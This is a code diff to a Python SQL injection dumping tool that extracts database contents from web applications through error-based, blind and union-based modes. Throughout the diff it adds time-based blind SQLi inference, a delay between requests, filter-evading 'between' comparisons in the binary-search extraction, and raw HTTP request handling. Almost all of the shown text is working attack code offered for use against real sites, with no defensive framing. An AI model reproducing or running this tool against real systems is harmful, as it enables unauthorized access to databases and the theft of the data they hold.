@@ -9,7 +9,8 @@ p.add_argument( '-p' , '--post'    , metavar = 'POST'         , help = 'to send 
 p.add_argument( '-c' , '--cookie'  , metavar = 'COOKIE'       , help = 'cookie to send with POST or GET'      )
 p.add_argument( '-r' , '--referer' , metavar = 'REFERER'      , help = 'Referer header in request'            )
 p.add_argument( '-a' , '--avoid'   , default = ''             , help = 'string of characters wich should be avoided in sql queries'   )
-p.add_argument( '-v' , '--verbose' , action = 'append_const'  , const = 1, default = []  , help = 'how much verbose should be output' )
+p.add_argument( '-t' , '--sleep'   , metavar = 'SECONDS', type = int, help = 'Time to sleep between requests' )
+p.add_argument( '-v' , '--verbose' , action  = 'append_const' , const = 1, default = []  , help = 'how much verbose should be output' )
 p.add_argument( '-E' , '--engine'  , default = 'mysql', choices = ['mysql', 'postgres']  , help = 'engine of database'  )
 p.add_argument( '-D' , metavar = 'DATABASE' , help = 'database to use' )
 p.add_argument( '-T' , metavar = 'TABLE'    , help = 'table to use'    )
@@ -25,6 +26,7 @@ pp.set_defaults( func = lambda : DError( args ).trun() )
 
 pp = sp.add_parser( 'blind', help = 'blind-based SQL dumper' )
 pp.add_argument( '-S', '--string', metavar = 'KEYWORD', help = 'Keyword which is located on page for True string' )
+pp.add_argument( '--ftime', metavar = 'SECONDS', type = float, help = 'False time anser for time-based SQLi' )
 pp.set_defaults( func = lambda : DBlind( args ).trun() )
 
 pp = sp.add_parser( 'union', help = 'union-based SQL dumper' )
@@ -89,10 +91,23 @@ class API( object ):
                     break               ## go out from for loop...
 
             else:  ## raw request
-                host = urlparse.urlparse( upc.split()[ 1 ] ).hostname
-                self.log( 0, "[i] RAW request to '%s'" % host )
+                m = re.search( 'host:\s*(.*)', upc, re.IGNORECASE )
+                if m:
+                    host = m.group( 1 ).strip()
+                else:
+                    host = urlparse.urlparse( upc.split()[ 1 ] ).hostname
+
+                self.log( 1, "[i] RAW request to '%s'" % host )
                 if 'connection: close' not in upc.lower():
                     self.log( 0, "[W] raw request haven't \"Connection: close\" it may slowdown requests!" )
+
+                ## fixing Content-Length...
+                if upc[ :4 ] == 'POST':
+                    m = re.search( '\r\n\r\n(.*)$', upc, re.DOTALL )
+                    if not m:
+                        self.err( '[E] can\'t find payload in raw request' )
+                    l = len( m.group( 1 ) )                                                                 ## take length of payload
+                    upc = re.sub( r'(content-length:)\s*\d+', r'\1 %s' % l, upc, flags = re.IGNORECASE )    ## fix it
 
                 self.log( 3, "[D] RAW request %s:\n-----\n%s\n-------\n" % ( n_try, upc ) )
                 s = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
@@ -118,6 +133,7 @@ class API( object ):
             code             : code for url ( 200, 404, 401 ... )
             lcnt, wcnt, ccnt : line, word and char counts for page
         """
+        dt = time.time()
         ccnt, wcnt, lcnt = None, None, None
         c, h = self.html( val )
         if c:
@@ -125,9 +141,13 @@ class API( object ):
             wcnt = len( h.split() )
             lcnt = len( h.split('\n') )
 
-        return c, lcnt, wcnt, ccnt
+        dt = time.time() - dt  ## how long is request time ?
+        return c, lcnt, wcnt, ccnt, dt
 
     def html( self, val = r'\1' ):
+        if self.a.sleep:
+            self.log( 1, "[i] sleeping for %s seconds..." % self.a.sleep )
+            time.sleep( self.a.sleep )
         r = re.compile( r'>>(.*)<<' )
         vs = [ self.a.upc, self.a.url, self.a.post, self.a.cookie ]
         vs = map( lambda x: x and r.sub( val, x ), vs )
@@ -267,17 +287,30 @@ class DBlind( API ):
     def dih( self, sss, s = 32, e = 126 ):
         while e - s > 0:
             m = ( e + s ) / 2
-            tsss = '(%s)>%s' % ( sss, m )
+            tsss = '%s between(%s)and(%s)' % ( sss, s, m )
             self.log( 2, '[D] testing: %s' % tsss )
-            _, l, _, _ = self.codes( tsss )
-            if l == self.l200:
-                self.log( 2, '[D] testing: l = %5s --> TRUE'  % l )
-                s, e = m + 1, e
-            elif l == self.l404:
-                self.log( 2, '[D] testing: l = %5s --> FALSE' % l )
-                s, e = s, m
-            else:
-                self.err( '[E] l != 200  ||  l != 404' )
+
+            _, l, _, _, dt = self.codes( tsss )
+            
+
+            if self.a.ftime:       ## time based SQLi
+                if dt > self.a.ftime:
+                    self.log( 2, '[D] answer time = %s sec. --> FALSE' % dt )
+                    s, e = m + 1, e
+                else:
+                    self.log( 2, '[D] answer time = %s sec. --> TRUE' %dt )
+                    s, e = s, m
+            else:                ## usual blind SQLi
+                if l == self.l404:
+                    self.log( 2, '[D] testing: l = %5s --> FALSE'  % l )
+                    s, e = m + 1, e
+                elif l == self.l200:
+                    self.log( 2, '[D] testing: l = %5s --> TRUE' % l )
+                    s, e = s, m
+                else:
+                    self.err( '[E] l != 200  ||  l != 404' )
+
+            self.log( 2, '[D] interval: [%s..%s]' % ( s, e ))
         return s
 
 
@@ -295,15 +328,23 @@ class DBlind( API ):
 
 
     def run( self ):
-        self.log( 0, '[i] testing for TRUE/FALSE pages taking only lines count values...' )
         t1 = self.codes( '2*2=4' )
         t2 = self.codes( '2*2=5' )
-        self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, [l = %5s], w = %5s, c = %5s )' % t1 )
-        self.log( 0, '[i] codes for FALSE page --> ( c = %4s, [l = %5s], w = %5s, c = %5s )' % t2 )
-        self.l200 = t1[ 1 ]   ## count of lines for normal answer
-        self.l404 = t2[ 1 ]   ## count of lines for error/404 answer
-        if self.l200 == self.l404:
-            self.err( '[!] count for true and fales pages are equal! (%s == %s)' % (self.l200, selfl404) )
+        if not self.a.ftime:
+            self.log( 0, '[i] testing for TRUE/FALSE pages taking only lines count values...' )
+            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, [l = %5s], w = %5s, c = %5s, time = %s )' % t1 )
+            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, [l = %5s], w = %5s, c = %5s, time = %s )' % t2 )
+            self.l200 = t1[ 1 ]   ## count of lines for normal answer
+            self.l404 = t2[ 1 ]   ## count of lines for error/404 answer
+            if self.l200 == self.l404:
+                self.err( '[!] count for true and fales pages are equal! (%s == %s)' % (self.l200, self.l404) )
+        else:
+            self.log( 0, '[i] testing for TRUE/FALSE pages for time based SQLi...' )
+            self.log( 0, '[i] codes for TRUE  page --> ( c = %4s, l = %5s, w = %5s, c = %5s, [time = %s] )' % t1 )
+            self.log( 0, '[i] codes for FALSE page --> ( c = %4s, l = %5s, w = %5s, c = %5s, [time = %s] )' % t2 )
+            if not ( t1[ -1 ] < t2[ -1 ] and t2[ -1 ] > self.a.ftime ):
+                self.err( '[!] can\'t determine TRUE/FALSE page by time' )
+
         API.run( self )       ## call standart process of retrieving SQL
 
 
